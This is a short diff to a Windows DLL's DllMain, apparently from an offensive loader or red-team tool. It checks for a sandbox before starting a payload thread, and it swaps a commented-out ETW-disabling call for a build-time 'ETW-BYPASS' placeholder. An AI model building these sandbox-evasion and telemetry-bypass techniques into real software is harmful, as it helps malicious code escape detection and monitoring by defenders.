@@ -13,8 +13,9 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
         if (is_sandboxed()) {
             //unload the DLL if sandbox checks fail
         } else {
-            // ETW patching maybe here
-            // disable_etw();
+            // DO NOT TOUCH
+            // will be replaced by 'disable_etw();' if --etw flag set at compilation
+            /*-%ETW-BYPASS%-*/
 
             CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)entrypoint, NULL, 0, NULL);
         }
